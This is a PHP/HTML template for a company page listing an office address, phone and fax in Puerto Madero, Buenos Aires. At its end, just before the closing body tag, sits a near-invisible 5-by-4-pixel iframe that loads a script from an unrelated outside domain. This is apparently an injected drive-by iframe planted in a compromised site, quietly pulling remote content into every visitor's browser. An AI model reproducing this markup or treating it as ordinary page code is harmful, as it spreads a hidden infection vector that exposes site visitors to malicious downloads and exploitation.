<?
	define ('authenticate', false);
	require ('inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	
	$oficinas['esp']='Oficinas en ';
	$oficinas['ing']='Offices in ';
	$oficinas['por']='Offices in ';
	
?>


<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="estilos<?=$socio?>.css" rel="stylesheet" type="text/css">
</head>

<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td valign="top"><table width="100%" height="20" border="0" cellpadding="0" cellspacing="0">
        <tr> 
          <td height="20" class="nombre"><?=$oficinas[$lng]?>Argentina</td>
        </tr>
        <tr> 
          <td class="partner">Av. Alicia Moreau de Justo 740, Loft 212</td>
        </tr>
        <tr> 
          <td height="10" class="partner">Puerto Madero - C1107 APP - Buenos Aires 
            - Argentina</td>
        </tr>
        <tr> 
          <td height="10" class="partner">Tel.: (54 11) 4343-3488 Fax: (54 11) 
            4343-8663 </td>
        </tr>
        <tr> 
          <td class="nombre">&nbsp;</td>
        </tr>
        <tr>
          <td class="nombre"><img src="images/Buenos-Aires1.jpg"></td>
        </tr>
        <tr>
          <td class="nombre">&nbsp;</td>
        </tr>
      </table></td>
  </tr>
</table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
